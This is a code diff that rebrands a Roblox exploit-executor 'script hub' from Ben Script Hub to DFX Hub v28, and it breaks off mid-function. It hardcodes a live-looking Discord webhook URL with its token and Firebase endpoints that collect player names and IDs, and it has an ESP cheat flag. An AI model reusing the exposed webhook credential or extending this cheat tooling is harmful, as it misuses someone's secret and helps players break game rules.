@@ -1,25 +1,52 @@
--- Ben Script Hub - Ultimate Edition (All Maps & Scripts Added)
+-- DFX Hub - Minimize Button, Floating Box Toggle, Pro Cards & Search
+-- Version: v28.0.0 | Developer: Tahbah
+
 local CoreGui = game:GetService("CoreGui")
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local TeleportService = game:GetService("TeleportService")
 local HttpService = game:GetService("HttpService")
-local RunService = game:GetService("RunService")
+local SoundService = game:GetService("SoundService")
+local MarketplaceService = game:GetService("MarketplaceService")
 
 local LocalPlayer = Players.LocalPlayer
 local parent = (gethui and gethui()) or CoreGui:FindFirstChild("RobloxGui") or LocalPlayer:WaitForChild("PlayerGui")
 
-if parent:FindFirstChild("BenScriptHubLoginUI") then parent.BenScriptHubLoginUI:Destroy() end
-if parent:FindFirstChild("BenScriptHubUI") then parent.BenScriptHubUI:Destroy() end
+if parent:FindFirstChild("DFXProV28UI") then parent.DFXProV28UI:Destroy() end
+if parent:FindFirstChild("DFXAdminBroadcastGui") then parent.DFXAdminBroadcastGui:Destroy() end
+if parent:FindFirstChild("DFXTopChatGui") then parent.DFXTopChatGui:Destroy() end
+if parent:FindFirstChild("DFXLoadingGui") then parent.DFXLoadingGui:Destroy() end
+
+local CONFIG_FILE = "DFX_Config_v28.json"
+local DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1563126439434391643/KPBO62mv7x_5ubaobKt3W-YjYACbTCsY-iefrPNQ7x99Q4tndOrxwQX6ts9zSU1csjcT"
+
+local FIREBASE_BASE_URL = "https://arad-hun-default-rtdb.firebaseio.com"
+local FIREBASE_CHAT_URL = FIREBASE_BASE_URL .. "/global_chat.json"
+local FIREBASE_USERS_URL = FIREBASE_BASE_URL .. "/active_users.json"
 
 local function customRequest(options)
-    local req = request or http_request or (syn and syn.request) or (http and http.request)
-    if req then return req(options) else return {StatusCode = 400, Body = ""} end
+    local req = request or http_request or (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request)
+    if req then
+        local success, response = pcall(function() return req(options) end)
+        if success and response then return response end
+    end
+    if options.Method == "GET" then
+        local success, body = pcall(function() return game:HttpGet(options.Url) end)
+        if success then return {StatusCode = 200, Body = body} end
+    end
+    return {StatusCode = 400, Body = "null"}
+end
+
+local function safeDecode(jsonStr)
+    if not jsonStr or jsonStr == "" or jsonStr == "null" then return nil end
+    local success, result = pcall(function() return HttpService:JSONDecode(jsonStr) end)
+    if success then return result end
+    return nil
 end
 
 local function fetchAsset(url, fileName)
     if writefile and getcustomasset and readfile then
-        local file = "BenHub_" .. fileName .. ".png"
+        local file = "DFXHub_" .. fileName .. ".jpg"
         if not isfile(file) then
             pcall(function() writefile(file, game:HttpGet(url)) end)
         end
@@ -28,623 +55,104 @@ local function fetchAsset(url, fileName)
     return url
 end
 
-local logoAsset = fetchAsset("https://j.top4top.io/p_39224zme21.png", "logo_ben")
-local bannerAsset = fetchAsset("https://c.top4top.io/p_3933a1ntu0.png", "banner_new")
+local wallUrls = {
+    fetchAsset("https://d.top4top.io/p_3947d1izj0.jpg", "bg_1"),
+    fetchAsset("https://e.top4top.io/p_394715j211.jpg", "bg_2"),
+    fetchAsset("https://l.top4top.io/p_3947ds5ic0.jpg", "bg_3"),
+    fetchAsset("https://a.top4top.io/p_3947hoh3p1.jpg", "bg_4"),
+    fetchAsset("https://b.top4top.io/p_3947wn78l2.jpg", "bg_5"),
+    fetchAsset("https://c.top4top.io/p_3947n55o83.jpg", "bg_6"),
+    fetchAsset("https://d.top4top.io/p_394754mmu4.jpg", "bg_7"),
+    fetchAsset("https://e.top4top.io/p_39475mm3q5.jpg", "bg_8"),
+}
 
-local particlesEnabled = true
-local configFile = "BenHub_Config_v10.txt"
+local EGG_MAP_IMAGE = fetchAsset("https://k.top4top.io/p_3948flo0t0.jpg", "egg_map")
+local BREAK_EGG_MAP_IMAGE = fetchAsset("https://e.top4top.io/p_3948fd0c20.jpg", "break_egg_map")
+-- صورة الفقاعة المربعة عند التصغير
+local MINIMIZE_ICON_IMAGE = fetchAsset("https://k.top4top.io/p_3948z05tb0.png", "min_icon")
 
-if isfile and readfile and isfile(configFile) then
-    pcall(function()
-        local data = HttpService:JSONDecode(readfile(configFile))
-        if data then particlesEnabled = (data.particles == nil) and true or data.particles end
-    end)
-end
+local SOUND_OPEN = "rbxassetid://98797174600699"
+local SOUND_CLICK = "rbxassetid://6895079853"
 
-local FIREBASE_SUGGEST_URL = "https://benhubchat-24010-default-rtdb.firebaseio.com/suggestions.json"
-local FIREBASE_CHAT_URL = "https://benhubchat-24010-default-rtdb.firebaseio.com/global_chat.json"
-local FIREBASE_PRESENCE_URL = "https://benhubchat-24010-default-rtdb.firebaseio.com/presence"
+local neonSpeed = 8
+local currentAccentColor = Color3.fromRGB(0, 170, 255)
+local currentHeaderColor = Color3.fromRGB(0, 100, 200)
 
----------------------------------------------------------
--- الواجهة الرئيسية
----------------------------------------------------------
-local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Name = "BenScriptHubUI"
-ScreenGui.ResetOnSpawn = false
-ScreenGui.Parent = parent
+local selectedScriptBgIndex = 0
+local selectedChatBgIndex = 0
+local espEnabled = false
 
-local Main = Instance.new("Frame")
-Main.Name = "Main"
-Main.Size = UDim2.new(0, 530, 0, 290)
-Main.Position = UDim2.new(0.5, -265, 0.5, -145)
-Main.BackgroundColor3 = Color3.fromRGB(16, 16, 22)
-Main.BorderSizePixel = 0
-Main.Active = true
-Main.Draggable = true
-Main.ClipsDescendants = true
-Main.Visible = false
-Main.Parent = ScreenGui
+local registeredWingStrokes = {}
+local registeredOptionStrokes = {}
+local activeNameLabels = {}
 
-Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 10)
-local MainStroke = Instance.new("UIStroke")
-MainStroke.Color = Color3.fromRGB(200, 30, 45)
-MainStroke.Thickness = 1.5
-MainStroke.Parent = Main
-
----------------------------------------------------------
--- شاشة تسجيل الدخول
----------------------------------------------------------
-local LoginGui = Instance.new("ScreenGui")
-LoginGui.Name = "BenScriptHubLoginUI"
-LoginGui.ResetOnSpawn = false
-LoginGui.IgnoreGuiInset = true
-LoginGui.DisplayOrder = 999999
-LoginGui.Parent = parent
-
-local LoginBg = Instance.new("Frame")
-LoginBg.Size = UDim2.new(1, 0, 1, 0)
-LoginBg.BackgroundColor3 = Color3.fromRGB(10, 10, 14)
-LoginBg.BackgroundTransparency = 0.2
-LoginBg.Parent = LoginGui
-
-local LoginCard = Instance.new("Frame")
-LoginCard.Size = UDim2.new(0, 320, 0, 220)
-LoginCard.Position = UDim2.new(0.5, -160, 0.5, -110)
-LoginCard.BackgroundColor3 = Color3.fromRGB(18, 18, 25)
-LoginCard.Parent = LoginBg
-
-Instance.new("UICorner", LoginCard).CornerRadius = UDim.new(0, 12)
-local LoginStroke = Instance.new("UIStroke")
-LoginStroke.Color = Color3.fromRGB(255, 215, 0)
-LoginStroke.Thickness = 1.8
-LoginStroke.Parent = LoginCard
-
-local LoginLogo = Instance.new("ImageLabel")
-LoginLogo.Size = UDim2.new(0, 140, 0, 50)
-LoginLogo.Position = UDim2.new(0.5, -70, 0, 12)
-LoginLogo.BackgroundTransparency = 1
-LoginLogo.Image = logoAsset
-LoginLogo.ScaleType = Enum.ScaleType.Fit
-LoginLogo.Parent = LoginCard
-
-local WelcomeTitle = Instance.new("TextLabel")
-WelcomeTitle.Size = UDim2.new(1, 0, 0, 20)
-WelcomeTitle.Position = UDim2.new(0, 0, 0, 68)
-WelcomeTitle.BackgroundTransparency = 1
-WelcomeTitle.Text = "أهلاً بك: " .. (LocalPlayer.DisplayName ~= "" and LocalPlayer.DisplayName or LocalPlayer.Name)
-WelcomeTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
-WelcomeTitle.Font = Enum.Font.SourceSansBold
-WelcomeTitle.TextSize = 14
-WelcomeTitle.Parent = LoginCard
-
-local LoginAvatar = Instance.new("ImageLabel")
-LoginAvatar.Size = UDim2.new(0, 50, 0, 50)
-LoginAvatar.Position = UDim2.new(0.5, -25, 0, 92)
-LoginAvatar.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
-LoginAvatar.Image = "rbxthumb://type=AvatarHeadShot&id=" .. LocalPlayer.UserId .. "&w=150&h=150"
-LoginAvatar.Parent = LoginCard
-Instance.new("UICorner", LoginAvatar).CornerRadius = UDim.new(1, 0)
-
-local LoginBtn = Instance.new("TextButton")
-LoginBtn.Size = UDim2.new(0, 200, 0, 38)
-LoginBtn.Position = UDim2.new(0.5, -100, 0, 155)
-LoginBtn.BackgroundColor3 = Color3.fromRGB(180, 25, 35)
-LoginBtn.Text = "🔓 تسجيل الدخول"
-LoginBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-LoginBtn.Font = Enum.Font.SourceSansBold
-LoginBtn.TextSize = 15
-LoginBtn.Parent = LoginCard
-Instance.new("UICorner", LoginBtn).CornerRadius = UDim.new(0, 8)
-
-LoginBtn.MouseButton1Click:Connect(function()
-    TweenService:Create(LoginCard, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.In), {Size = UDim2.new(0, 0, 0, 0), Position = UDim2.new(0.5, 0, 0.5, 0)}):Play()
-    TweenService:Create(LoginBg, TweenInfo.new(0.4), {BackgroundTransparency = 1}):Play()
-    task.wait(0.4)
-    LoginGui:Destroy()
-    Main.Visible = true
-end)
-
----------------------------------------------------------
--- البارتكلز
----------------------------------------------------------
-local ParticlesFrame = Instance.new("Frame")
-ParticlesFrame.Size = UDim2.new(1, 0, 1, 0)
-ParticlesFrame.BackgroundTransparency = 1
-ParticlesFrame.ZIndex = 1
-ParticlesFrame.Parent = Main
-
-local activeStars = {}
-local function clearParticles()
-    for _, el in ipairs(activeStars) do if el.frame then el.frame:Destroy() end end
-    activeStars = {}
-end
-
-local function spawnParticles()
-    clearParticles()
-    if not particlesEnabled then return end
-    for i = 1, 22 do
-        local star = Instance.new("Frame")
-        local sz = math.random(2, 4)
-        star.Size = UDim2.new(0, sz, 0, sz)
-        star.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-        star.BackgroundTransparency = math.random(3, 7) / 10
-        star.BorderSizePixel = 0
-        star.ZIndex = 1
-        star.Position = UDim2.new(math.random(), 0, math.random(), 0)
-        star.Parent = ParticlesFrame
-        Instance.new("UICorner", star).CornerRadius = UDim.new(1, 0)
-        table.insert(activeStars, {frame = star, speedY = -math.random(2, 8) / 10000})
+local function saveUserSettings()
+    if writefile then
+        local cfg = {
+            scriptBg = selectedScriptBgIndex,
+            chatBg = selectedChatBgIndex,
+            r = currentAccentColor.R,
+            g = currentAccentColor.G,
+            b = currentAccentColor.B,
+            hr = currentHeaderColor.R,
+            hg = currentHeaderColor.G,
+            hb = currentHeaderColor.B
+        }
+        pcall(function() writefile(CONFIG_FILE, HttpService:JSONEncode(cfg)) end)
     end
 end
-spawnParticles()
 
-task.spawn(function()
-    while Main and Main.Parent do
-        if particlesEnabled then
-            for _, el in ipairs(activeStars) do
-                if el.frame and el.frame.Parent then
-                    local posY = el.frame.Position.Y.Scale + el.speedY
-                    if posY < -0.05 then posY = 1.05 end
-                    el.frame.Position = UDim2.new(el.frame.Position.X.Scale, 0, posY, 0)
+local function loadUserSettings()
+    if readfile and isfile and isfile(CONFIG_FILE) then
+        pcall(function()
+            local cfg = safeDecode(readfile(CONFIG_FILE))
+            if cfg then
+                selectedScriptBgIndex = cfg.scriptBg or 0
+                selectedChatBgIndex = cfg.chatBg or 0
+                if cfg.r and cfg.g and cfg.b then
+                    currentAccentColor = Color3.new(cfg.r, cfg.g, cfg.b)
+                end
+                if cfg.hr and cfg.hg and cfg.hb then
+                    currentHeaderColor = Color3.new(cfg.hr, cfg.hg, cfg.hb)
                 end
             end
-        end
-        task.wait(0.03)
-    end
-end)
-
----------------------------------------------------------
--- زر الإغلاق والأزرار العائمة
----------------------------------------------------------
-local CloseBtn = Instance.new("TextButton")
-CloseBtn.Size = UDim2.new(0, 22, 0, 22)
-CloseBtn.Position = UDim2.new(1, -26, 0, 6)
-CloseBtn.BackgroundColor3 = Color3.fromRGB(200, 35, 45)
-CloseBtn.Text = "✕"
-CloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-CloseBtn.Font = Enum.Font.SourceSansBold
-CloseBtn.TextSize = 13
-CloseBtn.ZIndex = 10
-CloseBtn.Parent = Main
-Instance.new("UICorner", CloseBtn).CornerRadius = UDim.new(0, 5)
-
-local BenOpenBtn = Instance.new("ImageButton")
-BenOpenBtn.Name = "BenOpenBtn"
-BenOpenBtn.Size = UDim2.new(0, 52, 0, 52)
-BenOpenBtn.Position = UDim2.new(0, 15, 0.5, -26)
-BenOpenBtn.BackgroundColor3 = Color3.fromRGB(18, 18, 24)
-BenOpenBtn.Image = logoAsset
-BenOpenBtn.Visible = false
-BenOpenBtn.Active = true
-BenOpenBtn.Draggable = true
-BenOpenBtn.Parent = ScreenGui
-
-Instance.new("UICorner", BenOpenBtn).CornerRadius = UDim.new(1, 0)
-local openStroke = Instance.new("UIStroke")
-openStroke.Color = Color3.fromRGB(255, 215, 0)
-openStroke.Thickness = 2
-openStroke.Parent = BenOpenBtn
-
-CloseBtn.MouseButton1Click:Connect(function() Main.Visible = false; BenOpenBtn.Visible = true end)
-BenOpenBtn.MouseButton1Click:Connect(function() Main.Visible = true; BenOpenBtn.Visible = false end)
-
----------------------------------------------------------
--- نظام الشات وتصميم مميزات
----------------------------------------------------------
-local TopChatToggleBtn = Instance.new("TextButton")
-TopChatToggleBtn.Name = "TopChatToggleBtn"
-TopChatToggleBtn.Size = UDim2.new(0, 44, 0, 44)
-TopChatToggleBtn.Position = UDim2.new(0, 15, 0, 15)
-TopChatToggleBtn.BackgroundColor3 = Color3.fromRGB(22, 22, 32)
-TopChatToggleBtn.Text = "💬"
-TopChatToggleBtn.TextSize = 22
-TopChatToggleBtn.ZIndex = 999
-TopChatToggleBtn.Active = true
-TopChatToggleBtn.Draggable = true
-TopChatToggleBtn.Parent = ScreenGui
-
-Instance.new("UICorner", TopChatToggleBtn).CornerRadius = UDim.new(0, 12)
-local chatBtnStroke = Instance.new("UIStroke")
-chatBtnStroke.Color = Color3.fromRGB(255, 215, 0)
-chatBtnStroke.Thickness = 1.8
-chatBtnStroke.Parent = TopChatToggleBtn
-
-local ChatWindow = Instance.new("Frame")
-ChatWindow.Name = "ChatWindow"
-ChatWindow.Size = UDim2.new(0, 390, 0, 290)
-ChatWindow.Position = UDim2.new(0, 70, 0, 15)
-ChatWindow.BackgroundColor3 = Color3.fromRGB(14, 14, 20)
-ChatWindow.Visible = false
-ChatWindow.Active = true
-ChatWindow.Draggable = true
-ChatWindow.ZIndex = 1000
-ChatWindow.Parent = ScreenGui
-
-Instance.new("UICorner", ChatWindow).CornerRadius = UDim.new(0, 12)
-local chatWinStroke = Instance.new("UIStroke")
-chatWinStroke.Color = Color3.fromRGB(200, 30, 45)
-chatWinStroke.Thickness = 1.8
-chatWinStroke.Parent = ChatWindow
-
-local ChatHeader = Instance.new("Frame")
-ChatHeader.Size = UDim2.new(1, 0, 0, 38)
-ChatHeader.BackgroundColor3 = Color3.fromRGB(20, 20, 28)
-ChatHeader.ZIndex = 1001
-ChatHeader.Parent = ChatWindow
-Instance.new("UICorner", ChatHeader).CornerRadius = UDim.new(0, 12)
-
-local ChatTitle = Instance.new("TextLabel")
-ChatTitle.Size = UDim2.new(0.35, 0, 1, 0)
-ChatTitle.Position = UDim2.new(0, 10, 0, 0)
-ChatTitle.BackgroundTransparency = 1
-ChatTitle.Text = "💬 الشات العام"
-ChatTitle.TextColor3 = Color3.fromRGB(255, 215, 0)
-ChatTitle.Font = Enum.Font.SourceSansBold
-ChatTitle.TextSize = 12
-ChatTitle.TextXAlignment = Enum.TextXAlignment.Left
-ChatTitle.ZIndex = 1002
-ChatTitle.Parent = ChatHeader
-
-local FeaturesBtn = Instance.new("TextButton")
-FeaturesBtn.Size = UDim2.new(0, 75, 0, 24)
-FeaturesBtn.Position = UDim2.new(0.36, 0, 0.5, -12)
-FeaturesBtn.BackgroundColor3 = Color3.fromRGB(180, 25, 35)
-FeaturesBtn.Text = "⭐ مميزات"
-FeaturesBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-FeaturesBtn.Font = Enum.Font.SourceSansBold
-FeaturesBtn.TextSize = 11
-FeaturesBtn.ZIndex = 1002
-FeaturesBtn.Parent = ChatHeader
-Instance.new("UICorner", FeaturesBtn).CornerRadius = UDim.new(0, 6)
-
-local ChatTimerLbl = Instance.new("TextLabel")
-ChatTimerLbl.Size = UDim2.new(0.45, -10, 1, 0)
-ChatTimerLbl.Position = UDim2.new(0.55, 0, 0, 0)
-ChatTimerLbl.BackgroundTransparency = 1
-ChatTimerLbl.Text = "⏱️ 30:00"
-ChatTimerLbl.TextColor3 = Color3.fromRGB(150, 255, 150)
-ChatTimerLbl.Font = Enum.Font.SourceSansBold
-ChatTimerLbl.TextSize = 11
-ChatTimerLbl.TextXAlignment = Enum.TextXAlignment.Right
-ChatTimerLbl.ZIndex = 1002
-ChatTimerLbl.Parent = ChatHeader
-
-local FeaturesModal = Instance.new("Frame")
-FeaturesModal.Size = UDim2.new(1, -12, 1, -12)
-FeaturesModal.Position = UDim2.new(0, 6, 0, 6)
-FeaturesModal.BackgroundColor3 = Color3.fromRGB(16, 16, 24)
-FeaturesModal.Visible = false
-FeaturesModal.ZIndex = 1010
-FeaturesModal.Parent = ChatWindow
-
-Instance.new("UICorner", FeaturesModal).CornerRadius = UDim.new(0, 10)
-local modalStroke = Instance.new("UIStroke")
-modalStroke.Color = Color3.fromRGB(255, 215, 0)
-modalStroke.Thickness = 1.5
-modalStroke.Parent = FeaturesModal
-
-local ModalHeader = Instance.new("Frame")
-ModalHeader.Size = UDim2.new(1, 0, 0, 36)
-ModalHeader.BackgroundColor3 = Color3.fromRGB(22, 22, 32)
-ModalHeader.ZIndex = 1011
-ModalHeader.Parent = FeaturesModal
-Instance.new("UICorner", ModalHeader).CornerRadius = UDim.new(0, 10)
-
-local ModalTitle = Instance.new("TextLabel")
-ModalTitle.Size = UDim2.new(1, -40, 1, 0)
-ModalTitle.Position = UDim2.new(0, 10, 0, 0)
-ModalTitle.BackgroundTransparency = 1
-ModalTitle.Text = "⭐ قائمة مميزات - مستخدمو السكربت"
-ModalTitle.TextColor3 = Color3.fromRGB(255, 215, 0)
-ModalTitle.Font = Enum.Font.SourceSansBold
-ModalTitle.TextSize = 12.5
-ModalTitle.TextXAlignment = Enum.TextXAlignment.Left
-ModalTitle.ZIndex = 1012
-ModalTitle.Parent = ModalHeader
-
-local CloseModalBtn = Instance.new("TextButton")
-CloseModalBtn.Size = UDim2.new(0, 24, 0, 24)
-CloseModalBtn.Position = UDim2.new(1, -30, 0, 6)
-CloseModalBtn.BackgroundColor3 = Color3.fromRGB(200, 35, 45)
-CloseModalBtn.Text = "✕"
-CloseModalBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-CloseModalBtn.Font = Enum.Font.SourceSansBold
-CloseModalBtn.TextSize = 12
-CloseModalBtn.ZIndex = 1012
-CloseModalBtn.Parent = ModalHeader
-Instance.new("UICorner", CloseModalBtn).CornerRadius = UDim.new(0, 5)
-
-local ActiveCountLbl = Instance.new("TextLabel")
-ActiveCountLbl.Size = UDim2.new(1, -20, 0, 20)
-ActiveCountLbl.Position = UDim2.new(0, 10, 0, 40)
-ActiveCountLbl.BackgroundTransparency = 1
-ActiveCountLbl.Text = "🟢 المتواجدون الآن: 0"
-ActiveCountLbl.TextColor3 = Color3.fromRGB(120, 255, 120)
-ActiveCountLbl.Font = Enum.Font.SourceSansBold
-ActiveCountLbl.TextSize = 11
-ActiveCountLbl.TextXAlignment = Enum.TextXAlignment.Left
-ActiveCountLbl.ZIndex = 1011
-ActiveCountLbl.Parent = FeaturesModal
-
-local UsersScroll = Instance.new("ScrollingFrame")
-UsersScroll.Size = UDim2.new(1, -16, 1, -68)
-UsersScroll.Position = UDim2.new(0, 8, 0, 62)
-UsersScroll.BackgroundTransparency = 1
-UsersScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
-UsersScroll.ScrollBarThickness = 3
-UsersScroll.ZIndex = 1011
-UsersScroll.Parent = FeaturesModal
-
-local UsersLayout = Instance.new("UIListLayout")
-UsersLayout.SortOrder = Enum.SortOrder.LayoutOrder
-UsersLayout.Padding = UDim.new(0, 6)
-UsersLayout.Parent = UsersScroll
-
-CloseModalBtn.MouseButton1Click:Connect(function() FeaturesModal.Visible = false end)
-FeaturesBtn.MouseButton1Click:Connect(function() FeaturesModal.Visible = not FeaturesModal.Visible end)
-
-local ChatScroll = Instance.new("ScrollingFrame")
-ChatScroll.Size = UDim2.new(1, -16, 0, 200)
-ChatScroll.Position = UDim2.new(0, 8, 0, 44)
-ChatScroll.BackgroundTransparency = 1
-ChatScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
-ChatScroll.ScrollBarThickness = 4
-ChatScroll.ZIndex = 1001
-ChatScroll.Parent = ChatWindow
-
-local ChatLayout = Instance.new("UIListLayout")
-ChatLayout.SortOrder = Enum.SortOrder.LayoutOrder
-ChatLayout.Padding = UDim.new(0, 6)
-ChatLayout.Parent = ChatScroll
-
-local ChatInputBox = Instance.new("TextBox")
-ChatInputBox.Size = UDim2.new(1, -85, 0, 32)
-ChatInputBox.Position = UDim2.new(0, 8, 1, -38)
-ChatInputBox.BackgroundColor3 = Color3.fromRGB(22, 22, 30)
-ChatInputBox.PlaceholderText = "اكتب رسالتك هنا..."
-ChatInputBox.Text = ""
-ChatInputBox.TextColor3 = Color3.fromRGB(255, 255, 255)
-ChatInputBox.Font = Enum.Font.SourceSans
-ChatInputBox.TextSize = 12
-ChatInputBox.ZIndex = 1001
-ChatInputBox.Parent = ChatWindow
-Instance.new("UICorner", ChatInputBox).CornerRadius = UDim.new(0, 6)
-
-local SendChatBtn = Instance.new("TextButton")
-SendChatBtn.Size = UDim2.new(0, 70, 0, 32)
-SendChatBtn.Position = UDim2.new(1, -78, 1, -38)
-SendChatBtn.BackgroundColor3 = Color3.fromRGB(180, 25, 35)
-SendChatBtn.Text = "إرسال 🚀"
-SendChatBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-SendChatBtn.Font = Enum.Font.SourceSansBold
-SendChatBtn.TextSize = 11.5
-SendChatBtn.ZIndex = 1001
-SendChatBtn.Parent = ChatWindow
-Instance.new("UICorner", SendChatBtn).CornerRadius = UDim.new(0, 6)
-
-TopChatToggleBtn.MouseButton1Click:Connect(function()
-    ChatWindow.Visible = not ChatWindow.Visible
-end)
-
----------------------------------------------------------
--- نظام إظهار الرسائل فوق رأس اللاعب (Floating Bubble)
----------------------------------------------------------
-local function showFloatingBubble(character, msgText)
-    if not character or not character:FindFirstChild("Head") then return end
-    local head = character.Head
-    
-    if head:FindFirstChild("BenChatBubble") then
-        head.BenChatBubble:Destroy()
-    end
-
-    local bill = Instance.new("BillboardGui")
-    bill.Name = "BenChatBubble"
-    bill.Size = UDim2.new(0, 200, 0, 50)
-    bill.StudsOffset = Vector3.new(0, 2.8, 0)
-    bill.AlwaysOnTop = true
-    bill.Adornee = head
-    bill.Parent = head
-
-    local frame = Instance.new("Frame")
-    frame.Size = UDim2.new(1, 0, 1, 0)
-    frame.BackgroundColor3 = Color3.fromRGB(15, 15, 22)
-    frame.BackgroundTransparency = 0.2
-    frame.Parent = bill
-    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 8)
-    
-    local stroke = Instance.new("UIStroke")
-    stroke.Color = Color3.fromRGB(255, 215, 0)
-    stroke.Thickness = 1.5
-    stroke.Parent = frame
-
-    local lbl = Instance.new("TextLabel")
-    lbl.Size = UDim2.new(1, -10, 1, -6)
-    lbl.Position = UDim2.new(0, 5, 0, 3)
-    lbl.BackgroundTransparency = 1
-    lbl.Text = msgText
-    lbl.TextColor3 = Color3.fromRGB(255, 255, 255)
-    lbl.Font = Enum.Font.SourceSansBold
-    lbl.TextSize = 13
-    lbl.TextWrapped = true
-    lbl.Parent = frame
-
-    task.delay(4, function()
-        if bill and bill.Parent then bill:Destroy() end
-    end)
-end
-
----------------------------------------------------------
--- نظام لقب المطور الملون المتحرك (Dms921)
----------------------------------------------------------
-local function setupDeveloperTag(character, playerName)
-    if playerName ~= "Dms921" then return end
-    if not character or not character:FindFirstChild("Head") then return end
-    local head = character.Head
-
-    if head:FindFirstChild("BenDevTag") then return end
-
-    local bill = Instance.new("BillboardGui")
-    bill.Name = "BenDevTag"
-    bill.Size = UDim2.new(0, 220, 0, 40)
-    bill.StudsOffset = Vector3.new(0, 3.8, 0)
-    bill.AlwaysOnTop = true
-    bill.Adornee = head
-    bill.Parent = head
-
-    local lbl = Instance.new("TextLabel")
-    lbl.Size = UDim2.new(1, 0, 1, 0)
-    lbl.BackgroundTransparency = 1
-    lbl.Text = "مطور Ben 👑"
-    lbl.Font = Enum.Font.SourceSansBold
-    lbl.TextSize = 16
-    lbl.TextStrokeTransparency = 0.3
-    lbl.Parent = bill
-
-    task.spawn(function()
-        while lbl and lbl.Parent do
-            local t = tick() * 2
-            lbl.TextColor3 = Color3.fromHSV((t % 5) / 5, 1, 1)
-            task.wait(0.05)
-        end
-    end)
-end
-
-for _, p in ipairs(Players:GetPlayers()) do
-    if p.Name == "Dms921" then
-        if p.Character then setupDeveloperTag(p.Character, p.Name) end
-        p.CharacterAdded:Connect(function(char) setupDeveloperTag(char, p.Name) end)
-    end
-end
-Players.PlayerAdded:Connect(function(p)
-    if p.Name == "Dms921" then
-        p.CharacterAdded:Connect(function(char) setupDeveloperTag(char, p.Name) end)
-    end
-end)
-
----------------------------------------------------------
--- الحماية وفلترة الشات
----------------------------------------------------------
-local badWords = {"كفر", "سب", "شتم", "قذف", "كس", "قحبة", "خرا", "حمار", "كلب", "زبي", "منيوك", "خول", "شرموط"}
-local lastSendTime = 0
-local lastMessageContent = ""
-
-local function checkBadContent(text)
-    local lowerText = string.lower(text)
-    if string.find(lowerText, "http") or string.find(lowerText, "www.") or string.find(lowerText, "%.com") or string.find(lowerText, "%.gg") or string.find(lowerText, "%.net") or string.find(lowerText, "%.org") or string.find(lowerText, "%.me") then
-        return true, "⚠️ ممنوع إرسال الروابط في الشات العام!"
-    end
-    for _, word in ipairs(badWords) do
-        if string.find(lowerText, word) then
-            return true, "⚠️ تم حظر الرسالة لتواجد ألفاظ بذيئة أو سب!"
-        end
-    end
-    return false, ""
-end
-
-local renderedMsgs = {}
-
-local function addChatMessage(msgId, userId, sender, msg)
-    if renderedMsgs[msgId] then return end
-    renderedMsgs[msgId] = true
-
-    local msgFrame = Instance.new("Frame")
-    msgFrame.Size = UDim2.new(1, 0, 0, 30)
-    msgFrame.BackgroundTransparency = 1
-    msgFrame.ZIndex = 1002
-    msgFrame.Parent = ChatScroll
-
-    if userId and userId ~= 0 then
-        local userImg = Instance.new("ImageLabel")
-        userImg.Size = UDim2.new(0, 26, 0, 26)
-        userImg.Position = UDim2.new(0, 0, 0, 2)
-        userImg.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
-        userImg.Image = "rbxthumb://type=AvatarHeadShot&id=" .. tostring(userId) .. "&w=150&h=150"
-        userImg.ZIndex = 1003
-        userImg.Parent = msgFrame
-        Instance.new("UICorner", userImg).CornerRadius = UDim.new(1, 0)
-    end
-
-    local msgText = Instance.new("TextLabel")
-    msgText.Size = UDim2.new(1, (userId and userId ~= 0) and -32 or 0, 1, 0)
-    msgText.Position = UDim2.new(0, (userId and userId ~= 0) and 32 or 0, 0, 0)
-    msgText.BackgroundTransparency = 1
-    msgText.Text = "<b>" .. sender .. ":</b> " .. msg
-    msgText.RichText = true
-    msgText.TextColor3 = Color3.fromRGB(240, 240, 250)
-    msgText.Font = Enum.Font.SourceSans
-    msgText.TextSize = 12
-    msgText.TextWrapped = true
-    msgText.TextXAlignment = Enum.TextXAlignment.Left
-    msgText.ZIndex = 1003
-    msgText.Parent = msgFrame
-
-    ChatScroll.CanvasSize = UDim2.new(0, 0, 0, ChatLayout.AbsoluteContentSize.Y + 12)
-    ChatScroll.CanvasPosition = Vector2.new(0, ChatScroll.AbsoluteCanvasSize.Y)
-
-    local targetPlayer = Players:FindFirstChild(sender)
-    if targetPlayer and targetPlayer.Character then
-        showFloatingBubble(targetPlayer.Character, msg)
-    end
-end
-
-SendChatBtn.MouseButton1Click:Connect(function()
-    local text = ChatInputBox.Text
-    if text ~= "" and text ~= " " then
-        if tick() - lastSendTime < 2.5 then
-            addChatMessage("sys_spam_" .. math.random(1000,9999), 0, "نظام الحماية", "⏳ فضلاً، انتظر قليلاً قبل إرسال رسالة أخرى.")
-            return
-        end
-        if text == lastMessageContent then
-            addChatMessage("sys_repeat_" .. math.random(1000,9999), 0, "نظام الحماية", "⚠️ ممنوع تكرار نفس الرسالة تماماً!")
-            return
-        end
-
-        local isBlocked, warningMsg = checkBadContent(text)
-        if isBlocked then
-            addChatMessage("sys_warn_" .. math.random(1000,9999), 0, "نظام الحماية", warningMsg)
-            ChatInputBox.Text = ""
-            return
-        end
-
-        lastSendTime = tick()
-        lastMessageContent = text
-        local senderName = LocalPlayer.DisplayName ~= "" and LocalPlayer.DisplayName or LocalPlayer.Name
-        ChatInputBox.Text = ""
-
-        pcall(function()
-            customRequest({
-                Url = FIREBASE_CHAT_URL,
-                Method = "POST",
-                Headers = {["Content-Type"] = "application/json"},
-                Body = HttpService:JSONEncode({
-                    sender = senderName,
-                    userId = LocalPlayer.UserId,
-                    text = text,
-                    time = os.time()
-                })
-            })
         end)
     end
-end)
+end
 
----------------------------------------------------------
--- نظام إرسال واسترجاع الحضور (Presence System)
----------------------------------------------------------
+loadUserSettings()
+
+local function playUiSound(soundId, pitch, volume)
